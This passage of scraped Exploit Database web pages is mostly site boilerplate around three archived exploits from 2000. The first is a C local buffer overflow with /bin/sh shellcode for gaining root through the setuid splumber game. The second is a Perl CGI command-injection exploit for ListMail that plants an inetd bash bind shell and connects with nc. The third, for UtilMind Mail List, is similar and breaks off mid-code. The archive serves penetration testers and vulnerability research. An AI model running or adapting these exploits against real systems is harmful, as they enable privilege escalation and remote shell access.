to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 186
xsplumber - 'strcpy()' Local Buffer Overflow - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDxsplumber - 'strcpy()' Local Buffer OverflowEDB-ID:186CVE:EDB Verified:Author:vade79Type:localExploit:/Platform:LinuxDate:2000-11-17Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*(linux)splumber[version2] buffer overflow, by v9[v9@fakehalo.org].  this isa misc. exploit for the linux-SVGAlib space plumber game.  which, as youknow needs to be installed setuid root.  this overflow is due to a simpleoversight in the command line parser.  uses strcpy() to copy to an unchecked250 byte buffer.note: i also noticed, other than just being setuid root in the makefile, itsets splumber's permissions to 4777. *g*...and here is the perl script for the lazy person:#!/usr/bin/perl$i=$ARGV[0];while(1){print "using offset: $i.\n";system("./xsplumber $i");$i+=50;}*/#define PATH "/usr/games/splumber"	// change to the correct path.#define BUFFER_SIZE 257			// don't change.#define DEFAULT_OFFSET -300		// worked for me.static char exec[]="\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f\xb8\x1b\x56""\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80""\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01"; // still like it.long esp(void){__asm__("movl %esp,%eax");}int main(int argc,char **argv){char bof[BUFFER_SIZE];int i,offset;long ret;if(argc>1){offset=atoi(argv[1]);}else{offset=DEFAULT_OFFSET;}ret=(esp()-offset);printf("*** (linux)splumber[version2] local buffer overflow, by v9[v9@fakehalo.org].\n");printf("*** return address: 0x%lx, offset: %d.\n",ret,offset);for(i=0;i<(252-strlen(exec));i++){*(bof+i)=0x90;}memcpy(bof+i,exec,strlen(exec));*(long *)&bof[i+strlen(exec)]=ret; // perfect, not lazy for once.bof[BUFFER_SIZE-1]=0;if(execlp(PATH,"splumber",bof,0)){printf("error: program did not execute properly, check the path.\n");exit(0);}}# milw0rm.com [2000-11-17]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 187
ListMail 112 - Command Execution - CGI webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDListMail 112 - Command ExecutionEDB-ID:187CVE:EDB Verified:Author:teleh0rType:webappsExploit:/Platform:CGIDate:2000-11-17Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED#!/usr/bin/perl -w## Listmail v112 by P.M.Systems / PoC Exploit#### Listmail is a powerful, hands-free mailing## list manager which is exploitable due to an## insecure open call. This exploit will attempt## to bind a shell at port 60179/fido by using## inetd. Code to spawn an xterm is as always## included.#### http://teleh0r.cjb.net/ || teleh0r@doglover.comuse strict; use Socket;if (@ARGV < 1) {print("Usage: $0 <target>\n");exit(1);}my($target,$length,$cgicode,$agent,$sploit,$iaddr,$paddr,$proto);$target = $ARGV[0];print("\nRemote host: $target\n");print("CGI-script: /cgi-bin/lmail.pl\n");$agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)";# echo 'fido stream tcp nowait nobody /bin/bash bash -i' > /tmp/.hass;# /usr/sbin/inetd /tmp/.hass$cgicode ="\x63\x66\x67\x3d\x7c\x65\x63\x68\x6f\x2b\x27\x66\x69"."\x64\x6f\x2b\x73\x74\x72\x65\x61\x6d\x2b\x74\x63\x70"."\x2b\x6e\x6f\x77\x61\x69\x74\x2b\x6e\x6f\x62\x6f\x64"."\x79\x2b\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x2b\x62"."\x61\x73\x68\x2b\x2d\x69\x27\x2b\x3e\x2b\x2f\x74\x6d"."\x70\x2f\x2e\x68\x61\x73\x73\x3b\x2f\x75\x73\x72\x2f"."\x73\x62\x69\x6e\x2f\x69\x6e\x65\x74\x64\x2b\x2f\x74"."\x6d\x70\x2f\x2e\x68\x61\x73\x73\x7c";# Code to spawn an xterm - exploit would have to be modfied.# cfg=%7Cxterm+-ut+-display+localhost%3A0%7C$sploit ="POST /cgi-bin/lmail.pl HTTP/1.0Connection: closeUser-Agent: $agentHost: $targetContent-type: application/x-www-form-urlencodedContent-length: 130$cgicode";$iaddr = inet_aton($target)                     || die("Error: $!\n");$paddr = sockaddr_in(80, $iaddr)                || die("Error: $!\n");$proto = getprotobyname('tcp')                  || die("Error: $!\n");socket(SOCKET, PF_INET, SOCK_STREAM, $proto)    || die("Error: $!\n");connect(SOCKET, $paddr)                         || die("Error: $!\n");send(SOCKET,"$sploit\015\012", 0)               || die("Error: $!\n");close(SOCKET);print("\nSleeping 5 seconds - waiting for the shell ...\n\n");sleep(5); system("nc -w 10 $target 60179"); exit(0);# milw0rm.com [2000-11-17]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 188
UtilMind Mail List 1.7 - Users Can Execute Commands - CGI webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDUtilMind Mail List 1.7 - Users Can Execute CommandsEDB-ID:188CVE:EDB Verified:Author:teleh0rType:webappsExploit:/Platform:CGIDate:2000-11-17Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED#!/usr/bin/perl -w## Mailing List & News Version 1.7 / PoC Exploit.## UtilMind Solutions / http://www.utilmind.com/#### Actually a pretty amusing exploit to write!#### The 'open(MAIL, "|$mailprog $address")' ...## code sends e-mail to those who are on the## mailing list - and the subscribers' e-mail## addresses are located in a file called:## maillist.txt. (could be called anything, really)#### So we sign on 'hass@ & echo 'fido stream tcp ..'## and send out a mail to everyone on the list,## including to our 'evil' address. Sending mail## to the subscribers is supposed to be limited## to those who know the password - but it really## isn't - so we don't have to wait. <grin>#### Exploit will attempt to bind a shell at port## 60179/fido using inetd.#### http://teleh0r.cjb.net/ || teleh0r@doglover.comuse strict; use Socket;if (@ARGV < 1) {print("Usage: $0 <target>\n");exit(1);}my($target,$agent,$cgicodea,$cgicodeb,$code,$iaddr,$paddr,$proto);$target = $ARGV[0];$agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)";print("\nRemote host: $target\n");print("CGI-script: /cgi-bin/maillist.cgi\n");$code ="POST /cgi-bin/maillist.cgi HTTP/1.0Connection: Keep-AliveUser-Agent: $agentHost: $targetContent-type: application/x-www-form-urlencodedContent-length: 160";$cgicodea =# Utilmind Solutions Maillist Portbinding Cgicode# Yes! it is meant as a 